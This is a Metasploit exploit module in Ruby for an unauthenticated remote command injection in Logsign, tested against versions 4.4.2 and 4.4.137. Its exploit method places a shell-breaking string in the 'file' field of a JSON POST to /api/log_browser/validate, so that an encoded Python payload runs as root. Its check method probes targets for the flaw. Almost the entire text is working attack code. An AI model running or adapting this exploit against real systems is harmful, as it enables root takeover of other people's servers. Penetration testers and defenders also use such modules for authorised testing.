# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
 
  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Logsign Remote Command Injection&#039;,
      &#039;Description&#039;    => %q{
        This module exploits an command injection vulnerability in Logsign.
        By exploiting this vulnerability, unauthenticated users can execute
        arbitrary code under the root user.
 
        Logsign has a publicly accessible endpoint. That endpoint takes a user
        input and then use it during operating system command execution without
        proper validation.
 
        This module was tested against 4.4.2 and 4.4.137 versions.
      },
      &#039;License&#039;         => MSF_LICENSE,
      &#039;Author&#039;          =>
        [
          &#039;Mehmet Ince <mehmet@mehmetince.net>&#039;  # author & msf module
        ],
      &#039;References&#039;      =>
        [
        ],
      &#039;Privileged&#039;      => true,
      &#039;Platform&#039;        => [&#039;python&#039;],
      &#039;Arch&#039;            => ARCH_PYTHON,
      &#039;DefaultOptions&#039;  =>
        {
        },
      &#039;Targets&#039;         => [ [&#039;Automatic&#039;, {}] ],
      &#039;DisclosureDate&#039;  => &#039;Feb 26 2017&#039;,
      &#039;DefaultTarget&#039;   => 0
    ))
 
  end
 
  def check
    p_hash = {:file => "#{rand_text_alpha(15 + rand(4))}.raw"}
 
    res = send_request_cgi(
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;api&#039;, &#039;log_browser&#039;, &#039;validate&#039;),
      &#039;ctype&#039; => &#039;application/json&#039;,
      &#039;data&#039; => JSON.generate(p_hash)
    )
 
    if res && res.body.include?(&#039;{"message": "success", "success": true}&#039;)
      Exploit::CheckCode::Vulnerable
    else
      Exploit::CheckCode::Safe
    end
  end
 
  def exploit
    print_status("Delivering payload...")
 
    p_hash = {:file => "logsign.raw\" quit 2>&1 |python -c \"#{payload.encoded}\" #"}
 
    send_request_cgi(
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;api&#039;, &#039;log_browser&#039;, &#039;validate&#039;),
      &#039;ctype&#039; => &#039;application/json&#039;,
      &#039;data&#039; => JSON.generate(p_hash)
    )
  end
end

